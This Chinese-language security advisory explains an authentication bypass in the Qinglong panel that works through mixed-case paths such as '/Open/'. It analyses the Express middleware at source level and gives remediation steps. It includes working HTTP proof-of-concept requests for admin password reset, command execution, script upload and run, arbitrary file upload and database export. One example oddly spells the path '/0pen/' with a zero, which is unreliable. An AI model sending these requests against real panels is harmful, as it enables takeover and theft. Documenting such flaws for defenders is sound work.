# 青龙面板鉴权绕过漏洞（大小写绕过）+ 4篇整合

> 影响版本：≤ 2.20.1 | 利用复杂度：低 | 无CVE编号

## 漏洞概述

青龙面板存在严重**路径大小写鉴权绕过漏洞**，攻击者通过构造 `/Open/`、`/API/` 等混合大小写路径，绕过 Express 框架路由匹配（不区分大小写）与鉴权中间件（大小写敏感）的矛盾点，可实现：**账号接管、远程代码执行、任意文件上传/读写、敏感数据导出**。

## 漏洞原理（源码级分析）

### 核心缺陷位置

**文件**：`back/loaders/express.ts` 第54行

```typescript
// 鉴权中间件
app.use(async (req: Request, res, next) => {
  if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
    return next();  // 不匹配/open/ → 跳过鉴权
  }
  // ... 后续鉴权逻辑
});
```

```typescript
// 路由挂载（第123行）
app.use(rewrite('/open/*', '/api/$1'));  // 默认不区分大小写
app.use(config.api.prefix, routes());
```

### 绕过逻辑

```
请求：PUT /Open/system/auth/reset（注意 O 是大写）
判断：'/Open/system/auth/reset'.startsWith('/open/') → false（'O' != 'o'）
结果：!false 为 true → 直接 return next() → 跳过所有鉴权代码
路由层：rewrite 不区分大小写 → /Open/... → /api/... → 进入业务逻辑
```

### 服务层无二次校验

关键业务函数（`back/services/user.ts`、`back/services/script.ts`）直接信任传入参数，无权限检查：

```typescript
// 密码重置：直接更新数据库
await userService.resetAuthInfo(req.body);  // 无二次验证

// 脚本执行：直接写入并运行
await writeFileWithLock(filePath, content);  // 无内容检查
await scriptService.runScript(filePath);     // 无沙箱隔离
```

## 漏洞复现（POC）

### 1. 未授权重置管理员密码（账号接管）

```http
PUT /Open/system/auth/reset HTTP/1.1
Host: target:5700
Content-Type: application/json

{"username":"admin","password":"P@ssw0rd123"}
```

返回 `{"code":200,"message":"更新成功"}` 后可直接登录后台。

### 2. 未授权直接命令执行（RCE，最高效）

```http
PUT /0pen/system/command-run HTTP/1.1
Host: target:5700
Content-Type: application/json

{"command":"whoami"}
```

无文件落地，命令直接在 `/bin/bash` 执行，结果明文返回。

### 3. 未授权脚本写入并执行（文件落地方式）

```http
PUT /Open/scripts/run HTTP/1.1
Host: target:5700
Content-Type: application/json

{"filename":"pwn.sh","content":"#!/bin/bash\nid > /tmp/pwned.txt"}
```

脚本写入 `data/scripts/*.swap.sh`，执行后自动删除（无文件落地感）。

### 4. 未授权任意文件上传（头像上传接口）

```http
PUT /Api/user/avatar HTTP/1.1
Host: target:5700
Content-Type: multipart/form-data

[文件内容任意，如 .php、.sh、.html]
```

- 文件保存至 `data/upload/`，**扩展名无校验**
- 访问路径：`/api/static/{filename}`
- 头像上传绕过：`/api/user/avatar` → `/Api/user/avatar`（首字母大写）

### 5. 未授权导出敏感数据

```http
PUT /Open/system/data/export HTTP/1.1
Host: target:5700
Content-Type: application/json

{"type":"db"}
```

导出数据库文件（含管理员账号、任务配置、环境变量等敏感信息）。

## 其他可利用的未授权接口

| 接口 | 说明 | 绕过方式 |
|------|------|----------|
| `/api/system/data/import` | 导入恶意备份 | `/Open/system/data/import` |
| `/api/envs` | 环境变量读写 | `/Open/envs` |
| `/api/scripts` | 脚本管理（增删改查） | `/Open/scripts` |
| `/api/user/notification` | 通知配置 | `/Open/user/notification` |

## 修复建议

1. **启用大小写敏感路由**：Express 初始化时设置 `caseSensitiveRouting: true`
2. **暂无最新版本**：青龙面板最近更新在2025年12月26日，持续关注 [whyour/qinglong](https://github.com/whyour/qinglong/tags)
3. **临时防护**：仅允许可信IP访问管理端口；部署WAF拦截明文攻击
4. **排查入侵迹象**：检查异常登录用户，扫描恶意文件

### 攻击效果总结

- 绕过权限 → 执行任意命令 → 控制服务器
- 重置账密 → 账号接管 → 持久化控制
- 任意文件上传 → 植入Webshell/后门
- 数据导出 → 敏感信息泄露

### 核心问题定性

**典型基础逻辑设计缺陷**：开发者忽略 Express 框架路由匹配特性 + 鉴权层使用大小写敏感校验 + 业务层无二次验证，三重因素叠加导致漏洞危害被无限放大。
